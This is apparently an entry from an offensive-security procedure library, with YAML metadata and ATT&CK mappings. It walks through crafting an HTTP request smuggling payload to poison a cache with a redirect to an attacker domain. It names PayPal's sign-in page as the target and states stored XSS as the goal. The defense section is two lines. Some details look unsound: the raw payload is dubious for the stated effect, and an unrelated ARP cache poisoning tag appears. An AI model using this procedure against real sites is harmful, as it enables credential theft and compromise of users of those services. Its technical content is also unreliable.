---
tags:
  - http-request-smuggling
  - cache-poisoning
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/cURL]]'
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 86a1b80a-4a62-4319-8d9b-b5bdd35fe0f1
created_at: '2025-12-11T03:47:59.463Z'
updated_at: '2025-12-11T03:47:59.463Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1190]]'
---
# Craft Smuggling Request for Cached Redirect

## Summary

This procedure crafts and sends an HTTP Request Smuggling payload to create a cached redirect, poisoning the cache to point to attacker-controlled content.

## Description

By exploiting configuration issues in caching servers, this step smuggles a redirect request that gets cached, allowing subsequent legitimate requests to be redirected to malicious content. Targeted at PayPal's sign-in page, it sets up for stored XSS. Requires a vulnerable caching setup and tools for request manipulation.

## Requirements

1. Identified vulnerable endpoint from reconnaissance
2. Attacker-controlled domain for redirect target
3. Burp Suite for precise request crafting

## Defense

Defensive measures and detection strategies:

- Disable caching for sensitive pages
- Use WAF rules to block smuggling patterns

## Objectives

1. Poison the cache with a malicious redirect
2. Ensure the redirect persists for user access
3. Enable content injection for XSS

## Instructions

### Step 1: Prepare Smuggling Payload

**Context**: Use Burp to build the smuggling request.

**Command** ([[commands/burp-request-manipulation]]):
```http
POST /some-page HTTP/1.1
Host: paypal.com
Content-Length: 0
Transfer-Encoding: chunked

0
GET /signin HTTP/1.1
Host: attacker.com

```

> This smuggles a GET request redirecting to attacker.com.

### Step 2: Send and Confirm Poisoning

**Context**: Send the request and verify cache poisoning.

**Command** ([[commands/burp-request-manipulation]]):
```bash
# Use Burp Repeater to send and observe
```

> Access the page to confirm the cached redirect.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques

## Commands Used

- [[commands/burp-request-manipulation]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[commands/curl-http-smuggling]]
- [[ARP Cache Poisoning]]
